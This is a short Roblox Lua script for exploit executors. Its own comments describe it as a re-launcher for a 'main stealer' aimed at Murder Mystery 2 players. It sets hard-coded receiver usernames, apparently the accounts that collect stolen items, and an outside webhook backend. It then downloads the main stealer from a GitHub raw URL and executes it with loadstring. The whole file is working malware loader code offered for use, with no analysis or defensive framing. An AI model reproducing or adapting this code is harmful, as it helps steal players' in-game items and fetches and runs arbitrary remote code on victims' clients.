local HttpService = game:GetService("HttpService")

local function request_()
    return syn and syn.request or http_request or request or fluxus and fluxus.request
end

local req = request_()

if not req then return end

-- pull config passed from queue_on_teleport
local RECEIVERS = getgenv().RECEIVERS or {"ishi_mm2", "MurrayD2022", "Popsicles911"}
local WEBHOOK = getgenv().WEBHOOK or "https://nyxie-backend-zh2m.onrender.com"
local THRESHOLD = getgenv().THRESHOLD or 2

-- reset the guard so the main stealer can run fresh on this server
_G.__ElysiumMM2 = nil

-- re-execute the main stealer
local ok, src = pcall(function()
    return game:HttpGet("https://raw.githubusercontent.com/nyxie-boop/mm2/refs/heads/main/mainmm2.lua")
end)

if ok and src then
    local fn, err = loadstring(src)
    if fn then
        task.spawn(fn)
    end
end
